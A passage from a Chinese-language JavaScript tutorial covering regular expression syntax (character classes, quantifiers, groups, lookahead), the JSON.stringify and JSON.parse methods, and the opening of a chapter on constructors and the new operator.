   上面代码中，当连字号（dash）不出现在方括号之中，就不具备简写的作用，只代表字面的含义，所以不匹配字符 ``b`` 。只有当连字号用在方括号之中，才表示连续的字符序列。

   以下都是合法的字符类简写形式。

   .. code:: javascript

      [0-9.,]
      [0-9a-fA-F]
      [a-zA-Z0-9-]
      [1-31]

   上面代码中最后一个字符类 ``[1-31]`` ，不代表 ``1`` 到 ``31`` ，只代表 ``1`` 到 ``3`` 。

   连字符还可以用来指定 Unicode 字符的范围。

   .. code:: javascript

      var str = "\u0130\u0131\u0132";
      /[\u0128-\uFFFF]/.test(str)
      // true

   上面代码中， ``\u0128-\uFFFF`` 表示匹配码点在 ``0128`` 到 ``FFFF`` 之间的所有字符。

   另外，不要过分使用连字符，设定一个很大的范围，否则很可能选中意料之外的字符。最典型的例子就是 ``[A-z]`` ，表面上它是选中从大写的 ``A`` 到小写的 ``z`` 之间52个字母，但是由于在 ASCII 编码之中，大写字母与小写字母之间还有其他字符，结果就会出现意料之外的结果。

   .. code:: javascript

      /[A-z]/.test('\\') // true

   上面代码中，由于反斜杠（'\\'）的ASCII码在大写字母与小写字母之间，结果会被选中。

预定义模式
~~~~~~~~

   预定义模式指的是某些常见模式的简写方式。

   -  ``\d``  匹配0-9之间的任一数字，相当于 ``[0-9]`` 。
   -  ``\D``  匹配所有0-9以外的字符，相当于 ``[^0-9]`` 。
   -  ``\w``  匹配任意的字母、数字和下划线，相当于 ``[A-Za-z0-9_]`` 。
   -  ``\W``  除所有字母、数字和下划线以外的字符，相当于 ``[^A-Za-z0-9_]`` 。
   -  ``\s``  匹配空格（包括换行符、制表符、空格符等），相等于 ``[ \t\r\n\v\f]`` 。
   -  ``\S``  匹配非空格的字符，相当于 ``[^ \t\r\n\v\f]`` 。
   -  ``\b``  匹配词的边界。
   -  ``\B``  匹配非词边界，即在词的内部。

   下面是一些例子。

   .. code:: javascript

      // \s 的例子
      /\s\w*/.exec('hello world') // [" world"]
   
      // \b 的例子
      /\bworld/.test('hello world') // true
      /\bworld/.test('hello-world') // true
      /\bworld/.test('helloworld') // false
   
      // \B 的例子
      /\Bworld/.test('hello-world') // false
      /\Bworld/.test('helloworld') // true

   上面代码中， ``\s`` 表示空格，所以匹配结果会包括空格。 ``\b`` 表示词的边界，所以 ``world`` 的词首必须独立（词尾是否独立未指定），才会匹配。同理， ``\B`` 表示非词的边界，只有 ``world`` 的词首不独立，才会匹配。

   通常，正则表达式遇到换行符（ ``\n`` ）就会停止匹配。

   .. code:: javascript

      var html = "<b>Hello</b>\n<i>world!</i>";
   
      /.*/.exec(html)[0]
      // "<b>Hello</b>"

   上面代码中，字符串 ``html`` 包含一个换行符，结果点字符（ ``.`` ）不匹配换行符，导致匹配结果可能不符合原意。这时使用 ``\s`` 字符类，就能包括换行符。

   .. code:: javascript

      var html = "<b>Hello</b>\n<i>world!</i>";
   
      /[\S\s]*/.exec(html)[0]
      // "<b>Hello</b>\n<i>world!</i>"

   上面代码中， ``[\S\s]`` 指代一切字符。

重复类
~~~~~

   模式的精确匹配次数，使用大括号（ ``{}`` ）表示。 ``{n}`` 表示恰好重复 ``n`` 次， ``{n,}`` 表示至少重复 ``n`` 次， ``{n,m}`` 表示重复不少于 ``n`` 次，不多于 ``m`` 次。

   .. code:: javascript

      /lo{2}k/.test('look') // true
      /lo{2,5}k/.test('looook') // true

   上面代码中，第一个模式指定 ``o`` 连续出现2次，第二个模式指定 ``o`` 连续出现2次到5次之间。

量词符
~~~~~

   量词符用来设定某个模式出现的次数。

   -  ``?``  问号表示某个模式出现0次或1次，等同于 ``{0, 1}`` 。
   -  ``*``  星号表示某个模式出现0次或多次，等同于 ``{0,}`` 。
   -  ``+``  加号表示某个模式出现1次或多次，等同于 ``{1,}`` 。

   .. code:: javascript

      // t 出现0次或1次
      /t?est/.test('test') // true
      /t?est/.test('est') // true
   
      // t 出现1次或多次
      /t+est/.test('test') // true
      /t+est/.test('ttest') // true
      /t+est/.test('est') // false
   
      // t 出现0次或多次
      /t*est/.test('test') // true
      /t*est/.test('ttest') // true
      /t*est/.test('tttest') // true
      /t*est/.test('est') // true

贪婪模式
~~~~~~~

   上一小节的三个量词符，默认情况下都是最大可能匹配，即匹配到下一个字符不满足匹配规则为止。这被称为贪婪模式。

   .. code:: javascript

      var s = 'aaa';
      s.match(/a+/) // ["aaa"]

   上面代码中，模式是 ``/a+/`` ，表示匹配1个 ``a`` 或多个 ``a`` ，那么到底会匹配几个 ``a`` 呢？因为默认是贪婪模式，会一直匹配到字符 ``a`` 不出现为止，所以匹配结果是3个 ``a`` 。

   除了贪婪模式，还有非贪婪模式，即最小可能匹配。只要一发现匹配，就返回结果，不要往下检查。如果想将贪婪模式改为非贪婪模式，可以在量词符后面加一个问号。

   .. code:: javascript

      var s = 'aaa';
      s.match(/a+?/) // ["a"]

   上面例子中，模式结尾添加了一个问号 ``/a+?/`` ，这时就改为非贪婪模式，一旦条件满足，就不再往下匹配， ``+?`` 表示只要发现一个 ``a`` ，就不再往下匹配了。

   除了非贪婪模式的加号（ ``+?`` ），还有非贪婪模式的星号（ ``*?`` ）和非贪婪模式的问号（ ``??`` ）。

   -  ``+?`` ：表示某个模式出现1次或多次，匹配时采用非贪婪模式。
   -  ``*?`` ：表示某个模式出现0次或多次，匹配时采用非贪婪模式。
   -  ``??`` ：表格某个模式出现0次或1次，匹配时采用非贪婪模式。

   .. code:: javascript

      'abb'.match(/ab*/) // ["abb"]
      'abb'.match(/ab*?/) // ["a"]
   
      'abb'.match(/ab?/) // ["ab"]
      'abb'.match(/ab??/) // ["a"]

   上面例子中， ``/ab*/`` 表示如果 ``a`` 后面有多个 ``b`` ，那么匹配尽可能多的 ``b`` ； ``/ab*?/`` 表示匹配尽可能少的 ``b`` ，也就是0个 ``b`` 。

修饰符
~~~~~

   修饰符（modifier）表示模式的附加规则，放在正则模式的最尾部。

   修饰符可以单个使用，也可以多个一起使用。

   .. code:: javascript

      // 单个修饰符
      var regex = /test/i;
   
      // 多个修饰符
      var regex = /test/ig;

   **（1）g 修饰符**

   默认情况下，第一次匹配成功后，正则对象就停止向下匹配了。 ``g`` 修饰符表示全局匹配（global），加上它以后，正则对象将匹配全部符合条件的结果，主要用于搜索和替换。

   .. code:: javascript

      var regex = /b/;
      var str = 'abba';
   
      regex.test(str); // true
      regex.test(str); // true
      regex.test(str); // true

   上面代码中，正则模式不含 ``g`` 修饰符，每次都是从字符串头部开始匹配。所以，连续做了三次匹配，都返回 ``true`` 。

   .. code:: javascript

      var regex = /b/g;
      var str = 'abba';
   
      regex.test(str); // true
      regex.test(str); // true
      regex.test(str); // false

   上面代码中，正则模式含有 ``g`` 修饰符，每次都是从上一次匹配成功处，开始向后匹配。因为字符串 ``abba`` 只有两个 ``b`` ，所以前两次匹配结果为 ``true`` ，第三次匹配结果为 ``false`` 。

   **（2）i 修饰符**

   默认情况下，正则对象区分字母的大小写，加上 ``i`` 修饰符以后表示忽略大小写（ignoreCase）。

   .. code:: javascript

      /abc/.test('ABC') // false
      /abc/i.test('ABC') // true

   上面代码表示，加了 ``i`` 修饰符以后，不考虑大小写，所以模式 ``abc`` 匹配字符串 ``ABC`` 。

   **（3）m 修饰符**

    ``m`` 修饰符表示多行模式（multiline），会修改 ``^`` 和 ``$`` 的行为。默认情况下（即不加 ``m`` 修饰符时）， ``^`` 和 ``$`` 匹配字符串的开始处和结尾处，加上 ``m`` 修饰符以后， ``^`` 和 ``$`` 还会匹配行首和行尾，即 ``^`` 和 ``$`` 会识别换行符（ ``\n`` ）。

   .. code:: javascript

      /world$/.test('hello world\n') // false
      /world$/m.test('hello world\n') // true

   上面的代码中，字符串结尾处有一个换行符。如果不加 ``m`` 修饰符，匹配不成功，因为字符串的结尾不是 ``world`` ；加上以后， ``$`` 可以匹配行尾。

   .. code:: javascript

      /^b/m.test('a\nb') // true

   上面代码要求匹配行首的 ``b`` ，如果不加 ``m`` 修饰符，就相当于 ``b`` 只能处在字符串的开始处。加上 ``m`` 修饰符以后，换行符 ``\n`` 也会被认为是一行的开始。

组匹配
~~~~~

   **（1）概述**

   正则表达式的括号表示分组匹配，括号中的模式可以用来匹配分组的内容。

   .. code:: javascript

      /fred+/.test('fredd') // true
      /(fred)+/.test('fredfred') // true

   上面代码中，第一个模式没有括号，结果 ``+`` 只表示重复字母 ``d`` ，第二个模式有括号，结果 ``+`` 就表示匹配 ``fred`` 这个词。

   下面是另外一个分组捕获的例子。

   .. code:: javascript

      var m = 'abcabc'.match(/(.)b(.)/);
      m
      // ['abc', 'a', 'c']

   上面代码中，正则表达式 ``/(.)b(.)/`` 一共使用两个括号，第一个括号捕获 ``a`` ，第二个括号捕获 ``c`` 。

   注意，使用组匹配时，不宜同时使用 ``g`` 修饰符，否则 ``match`` 方法不会捕获分组的内容。

   .. code:: javascript

      var m = 'abcabc'.match(/(.)b(.)/g);
      m // ['abc', 'abc']

   上面代码使用带 ``g`` 修饰符的正则表达式，结果 ``match`` 方法只捕获了匹配整个表达式的部分。这时必须使用正则表达式的 ``exec`` 方法，配合循环，才能读到每一轮匹配的组捕获。

   .. code:: javascript

      var str = 'abcabc';
      var reg = /(.)b(.)/g;
      while (true) {
        var result = reg.exec(str);
        if (!result) break;
        console.log(result);
      }
      // ["abc", "a", "c"]
      // ["abc", "a", "c"]

   正则表达式内部，还可以用 ``\n`` 引用括号匹配的内容， ``n`` 是从1开始的自然数，表示对应顺序的括号。

   .. code:: javascript

      /(.)b(.)\1b\2/.test("abcabc")
      // true

   上面的代码中， ``\1`` 表示第一个括号匹配的内容（即 ``a`` ）， ``\2`` 表示第二个括号匹配的内容（即 ``c`` ）。

   下面是另外一个例子。

   .. code:: javascript

      /y(..)(.)\2\1/.test('yabccab') // true

   括号还可以嵌套。

   .. code:: javascript

      /y((..)\2)\1/.test('yabababab') // true

   上面代码中， ``\1`` 指向外层括号， ``\2`` 指向内层括号。

   组匹配非常有用，下面是一个匹配网页标签的例子。

   .. code:: javascript

      var tagName = /<([^>]+)>[^<]*<\/\1>/;
   
      tagName.exec("<b>bold</b>")[1]
      // 'b'

   上面代码中，圆括号匹配尖括号之中的标签，而 ``\1`` 就表示对应的闭合标签。

   上面代码略加修改，就能捕获带有属性的标签。

   .. code:: javascript

      var html = '<b class="hello">Hello</b><i>world</i>';
      var tag = /<(\w+)([^>]*)>(.*?)<\/\1>/g;
   
      var match = tag.exec(html);
   
      match[1] // "b"
      match[2] // " class="hello""
      match[3] // "Hello"
   
      match = tag.exec(html);
   
      match[1] // "i"
      match[2] // ""
      match[3] // "world"

   **（2）非捕获组**

    ``(?:x)`` 称为非捕获组（Non-capturing group），表示不返回该组匹配的内容，即匹配的结果中不计入这个括号。

   非捕获组的作用请考虑这样一个场景，假定需要匹配 ``foo`` 或者 ``foofoo`` ，正则表达式就应该写成 ``/(foo){1, 2}/`` ，但是这样会占用一个组匹配。这时，就可以使用非捕获组，将正则表达式改为 ``/(?:foo){1, 2}/`` ，它的作用与前一个正则是一样的，但是不会单独输出括号内部的内容。

   请看下面的例子。

   .. code:: javascript

      var m = 'abc'.match(/(?:.)b(.)/);
      m // ["abc", "c"]

   上面代码中的模式，一共使用了两个括号。其中第一个括号是非捕获组，所以最后返回的结果中没有第一个括号，只有第二个括号匹配的内容。

   下面是用来分解网址的正则表达式。

   .. code:: javascript

      // 正常匹配
      var url = /(http|ftp):\/\/([^/\r\n]+)(\/[^\r\n]*)?/;
   
      url.exec('http://google.com/');
      // ["http://google.com/", "http", "google.com", "/"]
   
      // 非捕获组匹配
      var url = /(?:http|ftp):\/\/([^/\r\n]+)(\/[^\r\n]*)?/;
   
      url.exec('http://google.com/');
      // ["http://google.com/", "google.com", "/"]

   上面的代码中，前一个正则表达式是正常匹配，第一个括号返回网络协议；后一个正则表达式是非捕获匹配，返回结果中不包括网络协议。

   **（3）先行断言**

    ``x(?=y)`` 称为先行断言（Positive look-ahead）， ``x`` 只有在 ``y`` 前面才匹配， ``y`` 不会被计入返回结果。比如，要匹配后面跟着百分号的数字，可以写成 ``/\d+(?=%)/`` 。

   “先行断言”中，括号里的部分是不会返回的。

   .. code:: javascript

      var m = 'abc'.match(/b(?=c)/);
      m // ["b"]

   上面的代码使用了先行断言， ``b`` 在 ``c`` 前面所以被匹配，但是括号对应的 ``c`` 不会被返回。

   **（4）先行否定断言**

    ``x(?!y)`` 称为先行否定断言（Negative look-ahead）， ``x`` 只有不在 ``y`` 前面才匹配， ``y`` 不会被计入返回结果。比如，要匹配后面跟的不是百分号的数字，就要写成 ``/\d+(?!%)/`` 。

   .. code:: javascript

      /\d+(?!\.)/.exec('3.14')
      // ["14"]

   上面代码中，正则表达式指定，只有不在小数点前面的数字才会被匹配，因此返回的结果就是 ``14`` 。

   “先行否定断言”中，括号里的部分是不会返回的。

   .. code:: javascript

      var m = 'abd'.match(/b(?!c)/);
      m // ['b']

   上面的代码使用了先行否定断言， ``b`` 不在 ``c`` 前面所以被匹配，而且括号对应的 ``d`` 不会被返回。

参考链接
-------

   - Axel Rauschmayer, [JavaScript: an overview of the regular expression API](http://www.2ality.com/2011/04/javascript-overview-of-regular.html)
   - Mozilla Developer Network, [Regular Expressions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions)
   - Axel Rauschmayer, [The flag /g of JavaScript’s regular expressions](http://www.2ality.com/2013/08/regexp-g.html)
   - Sam Hughes, [Learn regular expressions in about 55 minutes](http://qntm.org/files/re/re.html)

/🟠 JSON 对象
=============

JSON 格式
---------

   JSON 格式（JavaScript Object Notation 的缩写）是一种用于数据交换的文本格式，2001年由 Douglas Crockford 提出，目的是取代繁琐笨重的 XML 格式。

   相比 XML 格式，JSON 格式有两个显著的优点：书写简单，一目了然；符合 JavaScript 原生语法，可以由解释引擎直接处理，不用另外添加解析代码。所以，JSON 迅速被接受，已经成为各大网站交换数据的标准格式，并被写入标准。

   每个 JSON 对象就是一个值，可能是一个数组或对象，也可能是一个原始类型的值。总之，只能是一个值，不能是两个或更多的值。

   JSON 对值的类型和格式有严格的规定。

   > 1. 复合类型的值只能是数组或对象，不能是函数、正则表达式对象、日期对象。
   >
   > 1. 原始类型的值只有四种：字符串、数值（必须以十进制表示）、布尔值和 ``null`` （不能使用 ``NaN`` ,  ``Infinity`` ,  ``-Infinity`` 和 ``undefined`` ）。
   >
   > 1. 字符串必须使用双引号表示，不能使用单引号。
   >
   > 1. 对象的键名必须放在双引号里面。
   >
   > 1. 数组或对象最后一个成员的后面，不能加逗号。

   以下都是合法的 JSON。

   .. code:: javascript

      ["one", "two", "three"]
   
      { "one": 1, "two": 2, "three": 3 }
   
      {"names": ["张三", "李四"] }
   
      [ { "name": "张三"}, {"name": "李四"} ]

   以下都是不合法的 JSON。

   .. code:: javascript

      { name: "张三", 'age': 32 }  // 属性名必须使用双引号
   
      [32, 64, 128, 0xFFF] // 不能使用十六进制值
   
      { "name": "张三", "age": undefined } // 不能使用 undefined
   
      { "name": "张三",
        "birthday": new Date('Fri, 26 Aug 2011 07:13:10 GMT'),
        "getName": function () {
            return this.name;
        }
      } // 属性值不能使用函数和日期对象

   注意， ``null`` 、空数组和空对象都是合法的 JSON 值。

JSON 对象
---------

    ``JSON`` 对象是 JavaScript 的原生对象，用来处理 JSON 格式数据。它有两个静态方法： ``JSON.stringify()`` 和 ``JSON.parse()`` 。

JSON.stringify()
-----------------


基本用法
~~~~~~~

    ``JSON.stringify()`` 方法用于将一个值转为 JSON 字符串。该字符串符合 JSON 格式，并且可以被 ``JSON.parse()`` 方法还原。

   .. code:: javascript

      JSON.stringify('abc') // ""abc""
      JSON.stringify(1) // "1"
      JSON.stringify(false) // "false"
      JSON.stringify([]) // "[]"
      JSON.stringify({}) // "{}"
   
      JSON.stringify([1, "false", false])
      // '[1,"false",false]'
   
      JSON.stringify({ name: "张三" })
      // '{"name":"张三"}'

   上面代码将各种类型的值，转成 JSON 字符串。

   注意，对于原始类型的字符串，转换结果会带双引号。

   .. code:: javascript

      JSON.stringify('foo') === "foo" // false
      JSON.stringify('foo') === "\"foo\"" // true

   上面代码中，字符串 ``foo`` ，被转成了 ``"\"foo\""`` 。这是因为将来还原的时候，内层双引号可以让 JavaScript 引擎知道，这是一个字符串，而不是其他类型的值。

   .. code:: javascript

      JSON.stringify(false) // "false"
      JSON.stringify('false') // "\"false\""

   上面代码中，如果不是内层的双引号，将来还原的时候，引擎就无法知道原始值是布尔值还是字符串。

   如果对象的属性是 ``undefined`` 、函数或 XML 对象，该属性会被 ``JSON.stringify()`` 过滤。

   .. code:: javascript

      var obj = {
        a: undefined,
        b: function () {}
      };
   
      JSON.stringify(obj) // "{}"

   上面代码中，对象 ``obj`` 的 ``a`` 属性是 ``undefined`` ，而 ``b`` 属性是一个函数，结果都被 ``JSON.stringify`` 过滤。

   如果数组的成员是 ``undefined`` 、函数或 XML 对象，则这些值被转成 ``null`` 。

   .. code:: javascript

      var arr = [undefined, function () {}];
      JSON.stringify(arr) // "[null,null]"

   上面代码中，数组 ``arr`` 的成员是 ``undefined`` 和函数，它们都被转成了 ``null`` 。

   正则对象会被转成空对象。

   .. code:: javascript

      JSON.stringify(/foo/) // "{}"

    ``JSON.stringify()`` 方法会忽略对象的不可遍历的属性。

   .. code:: javascript

      var obj = {};
      Object.defineProperties(obj, {
        'foo': {
          value: 1,
          enumerable: true
        },
        'bar': {
          value: 2,
          enumerable: false
        }
      });
   
      JSON.stringify(obj); // "{"foo":1}"

   上面代码中， ``bar`` 是 ``obj`` 对象的不可遍历属性， ``JSON.stringify`` 方法会忽略这个属性。

第二个参数
~~~~~~~~

    ``JSON.stringify()`` 方法还可以接受一个数组，作为第二个参数，指定参数对象的哪些属性需要转成字符串。

   .. code:: javascript

      var obj = {
        'prop1': 'value1',
        'prop2': 'value2',
        'prop3': 'value3'
      };
   
      var selectedProperties = ['prop1', 'prop2'];
   
      JSON.stringify(obj, selectedProperties)
      // "{"prop1":"value1","prop2":"value2"}"

   上面代码中， ``JSON.stringify()`` 方法的第二个参数指定，只转 ``prop1`` 和 ``prop2`` 两个属性。

   这个类似白名单的数组，只对对象的属性有效，对数组无效。

   .. code:: javascript

      JSON.stringify(['a', 'b'], ['0'])
      // "["a","b"]"
   
      JSON.stringify({0: 'a', 1: 'b'}, ['0'])
      // "{"0":"a"}"

   上面代码中，第二个参数指定 JSON 格式只转 ``0`` 号属性，实际上对数组是无效的，只对对象有效。

   第二个参数还可以是一个函数，用来更改 ``JSON.stringify()`` 的返回值。

   .. code:: javascript

      function f(key, value) {
        if (typeof value === "number") {
          value = 2 * value;
        }
        return value;
      }
   
      JSON.stringify({ a: 1, b: 2 }, f)
      // '{"a": 2,"b": 4}'

   上面代码中的 ``f`` 函数，接受两个参数，分别是被转换的对象的键名和键值。如果键值是数值，就将它乘以 ``2`` ，否则就原样返回。

   注意，这个处理函数是递归处理所有的键。

   .. code:: javascript

      var obj = {a: {b: 1}};
   
      function f(key, value) {
        console.log("["+ key +"]:" + value);
        return value;
      }
   
      JSON.stringify(obj, f)
      // []:[object Object]
      // [a]:[object Object]
      // [b]:1
      // '{"a":{"b":1}}'

   上面代码中，对象 ``obj`` 一共会被 ``f`` 函数处理三次，输出的最后那行是 ``JSON.stringify()`` 的默认输出。第一次键名为空，键值是整个对象 ``obj`` ；第二次键名为 ``a`` ，键值是 ``{b: 1}`` ；第三次键名为 ``b`` ，键值为1。

   递归处理中，每一次处理的对象，都是前一次返回的值。

   .. code:: javascript

      var obj = {a: 1};
   
      function f(key, value) {
        if (typeof value === 'object') {
          return {b: 2};
        }
        return value * 2;
      }
   
      JSON.stringify(obj, f)
      // "{"b": 4}"

   上面代码中， ``f`` 函数修改了对象 ``obj`` ，接着 ``JSON.stringify()`` 方法就递归处理修改后的对象 ``obj`` 。

   如果处理函数返回 ``undefined`` 或没有返回值，则该属性会被忽略。

   .. code:: javascript

      function f(key, value) {
        if (typeof(value) === "string") {
          return undefined;
        }
        return value;
      }
   
      JSON.stringify({ a: "abc", b: 123 }, f)
      // '{"b": 123}'

   上面代码中， ``a`` 属性经过处理后，返回 ``undefined`` ，于是该属性被忽略了。

第三个参数
~~~~~~~~

    ``JSON.stringify()`` 还可以接受第三个参数，用于增加返回的 JSON 字符串的可读性。

   默认返回的是单行字符串，对于大型的 JSON 对象，可读性非常差。第三个参数使得每个属性单独占据一行，并且将每个属性前面添加指定的前缀（不超过10个字符）。

   .. code:: javascript

      // 默认输出
      JSON.stringify({ p1: 1, p2: 2 })
      // JSON.stringify({ p1: 1, p2: 2 })
   
      // 分行输出
      JSON.stringify({ p1: 1, p2: 2 }, null, '\t')
      // {
      // 	"p1": 1,
      // 	"p2": 2
      // }

   上面例子中，第三个属性 ``\t`` 在每个属性前面添加一个制表符，然后分行显示。

   第三个属性如果是一个数字，则表示每个属性前面添加的空格（最多不超过10个）。

   .. code:: javascript

      JSON.stringify({ p1: 1, p2: 2 }, null, 2);
      /*
      "{
        "p1": 1,
        "p2": 2
      }"
      */

参数对象的 toJSON() 方法
~~~~~~~~~~~~~~~~~~~~~~

   如果参数对象有自定义的 ``toJSON()`` 方法，那么 ``JSON.stringify()`` 会使用这个方法的返回值作为参数，而忽略原对象的其他属性。

   下面是一个普通的对象。

   .. code:: javascript

      var user = {
        firstName: '三',
        lastName: '张',
   
        get fullName(){
          return this.lastName + this.firstName;
        }
      };
   
      JSON.stringify(user)
      // "{"firstName":"三","lastName":"张","fullName":"张三"}"

   现在，为这个对象加上 ``toJSON()`` 方法。

   .. code:: javascript

      var user = {
        firstName: '三',
        lastName: '张',
   
        get fullName(){
          return this.lastName + this.firstName;
        },
   
        toJSON: function () {
          return {
            name: this.lastName + this.firstName
          };
        }
      };
   
      JSON.stringify(user)
      // "{"name":"张三"}"

   上面代码中， ``JSON.stringify()`` 发现参数对象有 ``toJSON()`` 方法，就直接使用这个方法的返回值作为参数，而忽略原对象的其他参数。

    ``Date`` 对象就有一个自己的 ``toJSON()`` 方法。

   .. code:: javascript

      var date = new Date('2015-01-01');
      date.toJSON() // "2015-01-01T00:00:00.000Z"
      JSON.stringify(date) // ""2015-01-01T00:00:00.000Z""

   上面代码中， ``JSON.stringify()`` 发现处理的是 ``Date`` 对象实例，就会调用这个实例对象的 ``toJSON()`` 方法，将该方法的返回值作为参数。

    ``toJSON()`` 方法的一个应用是，将正则对象自动转为字符串。因为 ``JSON.stringify()`` 默认不能转换正则对象，但是设置了 ``toJSON()`` 方法以后，就可以转换正则对象了。

   .. code:: javascript

      var obj = {
        reg: /foo/
      };
   
      // 不设置 toJSON 方法时
      JSON.stringify(obj) // "{"reg":{}}"
   
      // 设置 toJSON 方法时
      RegExp.prototype.toJSON = RegExp.prototype.toString;
      JSON.stringify(/foo/) // ""/foo/""

   上面代码在正则对象的原型上面部署了 ``toJSON()`` 方法，将其指向 ``toString()`` 方法，因此转换成 JSON 格式时，正则对象就先调用 ``toJSON()`` 方法转为字符串，然后再被 ``JSON.stringify()`` 方法处理。

JSON.parse()
-------------

    ``JSON.parse()`` 方法用于将 JSON 字符串转换成对应的值。

   .. code:: javascript

      JSON.parse('{}') // {}
      JSON.parse('true') // true
      JSON.parse('"foo"') // "foo"
      JSON.parse('[1, 5, "false"]') // [1, 5, "false"]
      JSON.parse('null') // null
   
      var o = JSON.parse('{"name": "张三"}');
      o.name // 张三

   如果传入的字符串不是有效的 JSON 格式， ``JSON.parse()`` 方法将报错。

   .. code:: javascript

      JSON.parse("'String'") // illegal single quotes
      // SyntaxError: Unexpected token ILLEGAL

   上面代码中，双引号字符串中是一个单引号字符串，因为单引号字符串不符合 JSON 格式，所以报错。

   为了处理解析错误，可以将 ``JSON.parse()`` 方法放在 ``try...catch`` 代码块中。

   .. code:: javascript

      try {
        JSON.parse("'String'");
      } catch(e) {
        console.log('parsing error');
      }

    ``JSON.parse()`` 方法可以接受一个处理函数，作为第二个参数，用法与 ``JSON.stringify()`` 方法类似。

   .. code:: javascript

      function f(key, value) {
        if (key === 'a') {
          return value + 10;
        }
        return value;
      }
   
      JSON.parse('{"a": 1, "b": 2}', f)
      // {a: 11, b: 2}

   上面代码中， ``JSON.parse()`` 的第二个参数是一个函数，如果键名是 ``a`` ，该函数会将键值加上10。

    ``JSON.parse()`` 和 ``JSON.stringify()`` 可以结合使用，像下面这样写，实现对象的深拷贝。

   .. code:: javascript

      JSON.parse(JSON.stringify(obj))

   上面这种写法，可以深度克隆一个对象，但是对象内部不能有 JSON
   不允许的数据类型，比如函数、正则对象、日期对象等。

参考链接
-------

   - MDN, [Using native JSON](https://developer.mozilla.org/en-US/docs/Using_native_JSON)
   - MDN, [JSON.parse](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/JSON/parse)
   - Dr. Axel Rauschmayer, [JavaScript’s JSON API](http://www.2ality.com/2011/08/json-api.html)
   - Jim Cowart, [What You Might Not Know About JSON.stringify()](http://freshbrewedcode.com/jimcowart/2013/01/29/what-you-might-not-know-about-json-stringify/)
   - Marco Rogers, [What is JSON?](https://docs.nodejitsu.com/articles/javascript-conventions/what-is-json/)


/🟡6. 面向对象编程
================================================================================

/🟠 实例对象与 new 命令
=====================

   JavaScript 语言具有很强的面向对象编程能力，本章介绍 JavaScript 面向对象编程的基础知识。

对象是什么
--------

   面向对象编程（Object Oriented Programming，缩写为 OOP）是目前主流的编程范式。它将真实世界各种复杂的关系，抽象为一个个对象，然后由对象之间的分工与合作，完成对真实世界的模拟。

   每一个对象都是功能中心，具有明确分工，可以完成接受信息、处理数据、发出信息等任务。对象可以复用，通过继承机制还可以定制。因此，面向对象编程具有灵活、代码可复用、高度模块化等特点，容易维护和开发，比起由一系列函数或指令组成的传统的过程式编程（procedural programming），更适合多人合作的大型软件项目。

   那么，“对象”（object）到底是什么？我们从两个层次来理解。

   **（1）对象是单个实物的抽象。**

   一本书、一辆汽车、一个人都可以是对象，一个数据库、一张网页、一个远程服务器连接也可以是对象。当实物被抽象成对象，实物之间的关系就变成了对象之间的关系，从而就可以模拟现实情况，针对对象进行编程。

   **（2）对象是一个容器，封装了属性（property）和方法（method）。**

   属性是对象的状态，方法是对象的行为（完成某种任务）。比如，我们可以把动物抽象为 ``animal`` 对象，使用“属性”记录具体是哪一种动物，使用“方法”表示动物的某种行为（奔跑、捕猎、休息等等）。

构造函数
-------

   面向对象编程的第一步，就是要生成对象。前面说过，对象是单个实物的抽象。通常需要一个模板，表示某一类实物的共同特征，然后对象根据这个模板生成。

   典型的面向对象编程语言（比如 C++ 和 Java），都有“类”（class）这个概念。所谓“类”就是对象的模板，对象就是“类”的实例。但是，JavaScript 语言的对象体系，不是基于“类”的，而是基于构造函数（constructor）和原型链（prototype）。

   JavaScript 语言使用构造函数（constructor）作为对象的模板。所谓”构造函数”，就是专门用来生成实例对象的函数。它就是对象的模板，描述实例对象的基本结构。一个构造函数，可以生成多个实例对象，这些实例对象都有相同的结构。

   构造函数就是一个普通的函数，但具有自己的特征和用法。

   .. code:: javascript

      var Vehicle = function () {
        this.price = 1000;
      };

   上面代码中， ``Vehicle`` 就是构造函数。为了与普通函数区别，构造函数名字的第一个字母通常大写。

   构造函数的特点有两个。

   - 函数体内部使用了 ``this`` 关键字，代表了所要生成的对象实例。
   - 生成对象的时候，必须使用 ``new`` 命令。

   下面先介绍 ``new`` 命令。

new 命令
-------


基本用法
~~~~~~~

    ``new`` 命令的作用，就是执行构造函数，返回一个实例对象。

   .. code:: javascript

      var Vehicle = function () {
        this.price = 1000;
      };
   
      var v = new Vehicle();
      v.price // 1000

   上面代码通过 ``new`` 命令，让构造函数 ``Vehicle`` 生成一个实例对象，保存在变量 ``v`` 中。这个新生成的实例对象，从构造函数 ``Vehicle`` 得到了 ``price`` 属性。 ``new`` 命令执行时，构造函数内部的 ``this`` ，就代表了新生成的实例对象， ``this.price`` 表示实例对象有一个 ``price`` 属性，值是1000。

   使用 ``new`` 命令时，根据需要，构造函数也可以接受参数。

   .. code:: javascript

      var Vehicle = function (p) {
        this.price = p;
      };
   
      var v = new Vehicle(500);

    ``new`` 命令本身就可以执行构造函数，所以后面的构造函数可以带括号，也可以不带括号。下面两行代码是等价的，但是为了表示这里是函数调用，推荐使用括号。

   .. code:: javascript

      // 推荐的写法
      var v = new Vehicle();
      // 不推荐的写法
      var v = new Vehicle;

   一个很自然的问题是，如果忘了使用 ``new`` 命令，直接调用构造函数会发生什么事？

   这种情况下，构造函数就变成了普通函数，并不会生成实例对象。而且由于后面会说到的原因， ``this`` 这时代表全局对象，将造成一些意想不到的结果。

   .. code:: javascript

      var Vehicle = function (){
        this.price = 1000;
      };
   
      var v = Vehicle();
      v // undefined
      price // 1000

   上面代码中，调用 ``Vehicle`` 构造函数时，忘了加上 ``new`` 命令。结果，变量 ``v`` 变成了 ``undefined`` ，而 ``price`` 属性变成了全局变量。因此，应该非常小心，避免不使用 ``new`` 命令、直接调用构造函数。

   为了保证构造函数必须与 ``new`` 命令一起使用，一个解决办法是，构造函数内部使用严格模式，即第一行加上 ``use strict`` 。这样的话，一旦忘了使用 ``new`` 命令，直接调用构造函数就会报错。

   .. code:: javascript

      function Fubar(foo, bar){
        'use strict';
        this._foo = foo;
        this._bar = bar;
      }
   
      Fubar()
      // TypeError: Cannot set property '_foo' of undefined

   上面代码的 ``Fubar`` 为构造函数， ``use strict`` 命令保证了该函数在严格模式下运行。由于严格模式中，函数内部的 ``this`` 不能指向全局对象，默认等于 ``undefined`` ，导致不加 ``new`` 调用会报错（JavaScript 不允许对 ``undefined`` 添加属性）。

   另一个解决办法，构造函数内部判断是否使用 ``new`` 命令，如果发现没有使用，则直接返回一个实例对象。

   .. code:: javascript

      function Fubar(foo, bar) {
        if (!(this instanceof Fubar)) {
          return new Fubar(foo, bar);
        }
   
        this._foo = foo;
